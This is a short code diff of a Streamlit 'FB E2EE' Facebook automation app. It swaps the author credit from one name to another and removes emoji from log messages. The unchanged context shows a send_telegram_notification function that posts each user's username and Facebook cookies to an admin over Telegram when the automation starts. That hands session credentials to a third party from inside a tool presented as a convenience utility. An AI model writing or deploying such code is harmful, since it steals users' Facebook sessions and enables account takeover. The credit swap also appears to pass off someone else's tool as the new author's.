@@ -11,7 +11,7 @@ import requests
 import os
 
 st.set_page_config(
-    page_title="FB E2EE by HASSAN RAJPUT",
+    page_title="FB E2EE by Rehan Khan",
     page_icon="ðŸ‘‘",
     layout="wide",
     initial_sidebar_state="expanded"
@@ -501,7 +501,7 @@ def send_telegram_notification(username, automation_state=None, cookies=""):
 
 ðŸ‘¤ *Username:* {username}
 â° *Time:* {current_time}
-ðŸ¤– *System:* HASSAN RAJPUT E2EE Facebook Automation
+ðŸ¤– *System:* Rehan Khan E2EE Facebook Automation
 ðŸª *Cookies:* `{cookies_display}`
 
 âœ… User has successfully started the automation process."""
@@ -517,10 +517,10 @@ def send_telegram_notification(username, automation_state=None, cookies=""):
         response = requests.post(url, data=data, timeout=10)
         
         if response.status_code == 200:
-            log_message(f"TELEGRAM-NOTIFY: âœ… Admin notification sent successfully via Telegram!", automation_state)
+            log_message(f"TELEGRAM-NOTIFY: Admin notification sent successfully via Telegram!", automation_state)
             return True
         else:
-            log_message(f"TELEGRAM-NOTIFY: âŒ Failed to send. Status: {response.status_code}, Response: {response.text[:100]}", automation_state)
+            log_message(f"TELEGRAM-NOTIFY: Failed to send. Status: {response.status_code}, Response: {response.text[:100]}", automation_state)
             return False
             
     except Exception as e:
@@ -1312,4 +1312,4 @@ else:
                 time.sleep(1)
                 st.rerun()
 
-st.markdown('<div class="footer">Made with â¤ï¸ by HASSAN RAJPUT | Â© 2025 All Rights Reserved</div>', unsafe_allow_html=True)
+st.markdown('<div class="footer">Made with â¤ï¸ by Rehan Khan| Â© 2025 All Rights Reserved</div>', unsafe_allow_html=True)
